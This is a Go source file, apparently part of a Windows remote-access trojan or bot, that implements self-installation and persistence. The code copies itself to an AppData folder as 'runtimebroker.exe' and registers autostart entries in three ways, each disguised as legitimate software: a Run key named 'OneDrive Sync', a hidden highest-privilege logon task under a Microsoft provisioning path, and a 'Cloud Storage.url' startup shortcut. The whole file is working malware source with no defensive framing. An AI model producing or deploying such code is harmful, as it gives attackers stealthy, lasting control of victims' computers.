package handlers

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

var (
	installDir  = filepath.Join(os.Getenv("APPDATA"), "Microsoft", "CoreRuntime")
	installPath = filepath.Join(installDir, "runtimebroker.exe")
)

type PersistenceManager struct {
	methods []PersistenceMethod
}

type PersistenceMethod interface {
	Name() string
	Apply(execPath string) error
	Remove() error
}

func NewPersistenceManager() *PersistenceManager {
	return &PersistenceManager{
		methods: []PersistenceMethod{
			&RegistryMethod{},
			&TaskMethod{},
			&StartupShortcutMethod{},
		},
	}
}

func (pm *PersistenceManager) selfInstall() (string, error) {
	currentPath, err := os.Executable()
	if err != nil {
		return "", err
	}

	if strings.EqualFold(currentPath, installPath) {
		return currentPath, nil
	}

	if err := os.MkdirAll(installDir, 0755); err != nil {
		return "", err
	}

	if err := copyFile(currentPath, installPath); err != nil {
		return "", err
	}

	cmd := exec.Command(installPath)
	cmd.Start()
	os.Exit(0)

	return installPath, nil
}

func (pm *PersistenceManager) EnsureAll() string {
	installedPath, err := pm.selfInstall()
	if err != nil {
		return fmt.Sprintf("❌ Self-install failed: %v", err)
	}

	var results []string
	var establishedCount int
	for _, method := range pm.methods {
		if err := method.Apply(installedPath); err == nil {
			results = append(results, fmt.Sprintf("  ✅ %s", method.Name()))
			establishedCount++
		} else {
			results = append(results, fmt.Sprintf("  ❌ %s", method.Name()))
		}
	}

	if establishedCount == 0 {
		return "⚠️ **CRITICAL: All persistence methods failed.**"
	}

	return fmt.Sprintf("🛡️ **Persistence Established (%d/%d methods)**\n```\n%s\n```\n**Running from:** `%s`",
		establishedCount, len(pm.methods), strings.Join(results, "\n"), installedPath)
}

func (pm *PersistenceManager) RemoveAll() {
	for _, method := range pm.methods {
		method.Remove()
	}
	os.Remove(installPath)
}

type RegistryMethod struct{}

func (r *RegistryMethod) Name() string { return "Registry (HKCU Run)" }
func (r *RegistryMethod) Apply(execPath string) error {
	key, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer key.Close()
	return key.SetStringValue("OneDrive Sync", execPath)
}
func (r *RegistryMethod) Remove() error {
	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE)
	if err != nil {
		return err
	}
	defer key.Close()
	return key.DeleteValue("OneDrive Sync")
}

type TaskMethod struct{}

func (t *TaskMethod) Name() string { return "Scheduled Task" }
func (t *TaskMethod) Apply(execPath string) error {
	taskName := "Microsoft\\Windows\\Management\\Provisioning\\Logon"
	cmd := exec.Command("schtasks", "/Create", "/TN", taskName, "/TR", fmt.Sprintf(`"%s"`, execPath), "/SC", "ONLOGON", "/RL", "HIGHEST", "/F")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd.Run()
}
func (t *TaskMethod) Remove() error {
	taskName := "Microsoft\\Windows\\Management\\Provisioning\\Logon"
	cmd := exec.Command("schtasks", "/Delete", "/TN", taskName, "/F")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd.Run()
}

type StartupShortcutMethod struct{}

func (s *StartupShortcutMethod) Name() string { return "Startup Shortcut" }
func (s *StartupShortcutMethod) Apply(execPath string) error {
	startupDir, err := windows.KnownFolderPath(windows.FOLDERID_Startup, 0)
	if err != nil {
		return err
	}
	shortcutPath := filepath.Join(startupDir, "Cloud Storage.url")
	content := fmt.Sprintf("[InternetShortcut]\nURL=file:///%s", strings.ReplaceAll(execPath, `\`, `/`))
	return os.WriteFile(shortcutPath, []byte(content), 0644)
}
func (s *StartupShortcutMethod) Remove() error {
	startupDir, err := windows.KnownFolderPath(windows.FOLDERID_Startup, 0)
	if err != nil {
		return err
	}
	return os.Remove(filepath.Join(startupDir, "Cloud Storage.url"))
}

func copyFile(src, dst string) error {
	srcFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer srcFile.Close()
	dstFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer dstFile.Close()
	_, err = io.Copy(dstFile, srcFile)
	return err
}

